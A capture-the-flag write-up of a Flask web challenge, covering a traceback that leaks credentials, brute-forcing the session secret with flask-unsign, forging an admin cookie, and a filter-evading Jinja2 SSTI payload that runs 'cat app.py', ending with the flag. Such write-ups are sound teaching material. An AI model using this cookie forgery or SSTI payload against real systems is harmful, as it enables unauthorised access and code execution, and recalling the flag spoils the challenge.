# Father's Light
> Enter the enigmatic realm of "Father of Light" Unleash your skills, explore hidden paths, and uncover the depths of mysterious creations. Will you emerge as the champion? Dare to unravel the enigma.

## About the Challenge
We were given a website (without the source code) and there is a login page in this website


[Image extracted text: 6 7 G
34.18.3.149.5000
LOGIN
Username:
Password:
Login]


## How to Solve?
If you check the HTTP response header, this website using Python and Werkzeug.


[Image extracted text: Request
Response
Pretty
Raw
Hex
Pretty
Raw
Hex
Render
GET
(login
HITP/1.1
HTIP/1-1
200
OI
Host
34 - 18
3-149: 5000
Server
Werkzeug/ --
3.6
Python/ 3 _
11--
User-Agent
Hozilla/5
(Windovs
10
Jin64;
x64;
Dat e
Sat
05
Aug 2023
08:22
GHT
rv:109
Gecko/EOJOOIO1
Firefox/[15
Content
Type:
text /htnl
charsetsut f-8
Accept
Content
Lengch:
1520
ext /htnl
applicat
on / xhthltznl
application/ <nl;q-0-9 , imagefav
Connect
on -
close
inage/uebp
Accept-Language
en-US
en;
IDOCTTPE
html>
Aecept
Encoding:
gzip ,
deflace
<henl>
Referer
http: / /34
3-149: 5000/dashboard
<head>
Connect
on:
elose
<citle>
Upgrade
Ins
cure-
Requests:
Login Page
~[cicle>
<style>
body{
4-0 .
9=0 -]


And now I tried to make the website error to know what is the response. In this case I made the website error by removing `password` parameter when hitting `/login` endpoint


[Image extracted text: File "Iapplvenvlliblpython3.11/site-packageslflask_limiterlextensionpy" , line 1162,in
inner
flask
current_app.ensure_sync(cast(Callable[P, R], obj)) (*a, **k)
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
File "applapp py" , line 28,in login
@app.route( ' /login'
methods-[ 'GET "
POST' ])
@limiter.limit("20
per minute'
def login()
if request.method
POST
username
request. form[
username
password
request.form[ 'password' ]
AAAAAAAAAAAAAAAAAAAAAAAA
pattern
select(union] | ' | "[orland|#| --I-/
I1-1
if
re.
search(pattern,
username)
flash( 'Do You think YOU
can Hack My Applicationnnnnnnn! ! ! "
error
return
render_template( 'login.html
error-True)
elif username
admin
and password
password"
File "lapplvenvlliblpython3 11/site-packageslwerkzeug/datastructures/structures py"
line 192 , in
_getitem
raise exceptions.BadRequestKeyError(key)
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA]


Hmmm there is an interesting code here especially in the `elif` part. Lets try to login using `admin:password` credential


[Image extracted text: 6 7 6
34.18.3.149.5000/user
0
5
=
WELCOME TO THE REGULAR USER PAGE
You are logged in as a regular user:
Logout]


Yay, we can login but as an `user`? Let's check the cookie value


[Image extracted text: Request
Response
Pretty
Raw
Hex
Pretty
Raw
Hex
Render
FET
luser
HTTP/1-1
HTTP/1-1
200
2 Host:
34-18,3-149: 5000
Server:
Verkzeug/--3.6 Python/3-11- -
User-
Agent
Hozilla/5
(Vindous
IT
10
Vine4 ;
264;
17:109
Gecko/ZO1OO1O1
Dace
Sat
2023
13:04:16
GHT
Firefox/115
Contenc-
Type
cext/htrl
charsetzuc f-8
Accept
Cont ent-Length:
1030
cexc/htrl
applicat
on / xhcaltxnl
applicat
on/ xnl
47-0
image/ avif
inage /vebp ,* /*;4-0
Vary:
Coolie
Accept-Language
en-US
en;9F0_
Connect_
on -
Close
lcept
Encoding:
gzip ,
deflace
Referer
http
1/34- 18 _
149:
5000/login
DOCTYPE
hthl?
Connect
on :
close
<hcnl>
Coolie
sess
on=
shead>
eJyrVsosjkIHyc3HU?JKSB-pTtVRKilOLYrPTFGYUj IOHLKCBPMScLOBAbCFt QDj SxGP
ZIISITg-IrGIJBGC
<citle>
FxPIkOiOLoE_Cuc_cGc
User Page
Upgrade
Ins
Cure=
Requescs:
</cicle>
style>
14
body {
15
background-color
#fzfzf2;
16
font-
fanily Arial
SsuS-
serif;
17
font -
s1ze
Gpx
18
line-
heighe
19
20
conc
ainer
background-color
4fff;
23
border
adius
1Opx
box-shadov: OOlOpxrgba(0
0 ,0,
0.21
margin: 5 Oprauto
Aug]


This website was using flask for Session-based auth. And because of this website using flask, we can bruteforce the secret key and changed the value of the cookie.

```bash
root@root:~$ flask-unsign --unsign --cookie ".eJyrVsosjk9Myc3MU7JKS8wpTtVRKi1OLYrPTFGyUjI0M1KC8PMSc1OBAhCFtQDj5xGP.ZM5ITg.NrGKbBGCkxPIk0iQLQE2Cuc2cGc" --wordlist /home/daffainfo/tools/rockyou.txt  --no-literal-eval
[*] Session decodes to: {'is_admin': False, 'user_id': '162', 'username': 'admin'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 30080 attempts
b'amorlove'
```

We got `amorlove`. And now tried to change the value of `is_admin` from `False` to `True`. Sign the cookie again using `flask-unsign`

```bash
root@root:~$ flask-unsign --sign --cookie "{'is_admin': True, 'user_id': '162', 'username': 'admin'" --secret 'amo
rlove'
.eJxTqlbPLI5PTMnNzFO3UggpKk3VUVAvLU4tis9MAQqoG5oZqUNF8hJzU0FCEMVKABlZEb0.ZM5KNg.PfOTwsnj9w7TxbSPYtQDuLg9lJQ
```

Use the cookie to access `/user` endpoint again and as you can see the the privilege was changed from `user` to `admin`. Now go to `/dashboard` and you will find another form that vulnerable SSTI. In the end the payload was something like this

```
POST /POST HTTP/1.1
Host: 34.18.3.149:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 124
Origin: http://34.18.3.149:5000
Connection: close
Referer: http://34.18.3.149:5000/dashboard
Cookie: session=eyJpc19hZG1pbiI6dHJ1ZSwidXNlcl9pZCI6IjEiLCJ1c2VybmFtZSI6ImRkZGQifQ.ZM2u4A.rbYhmXmWZmjpdzXAIQH6pb5EFfk
Upgrade-Insecure-Requests: 1

name={{lipsum['\x5f\x5fglobals\x5f\x5f']['os']['po''pen']('cat+app.py')['re''ad']()}}&email=test%40mail.com&post_content=test
```

> There is no screenshot for this part because the website was down

```
ASCWG{H0la_H@Ck3r5_Th1s_a_S3m6le_55TI}
```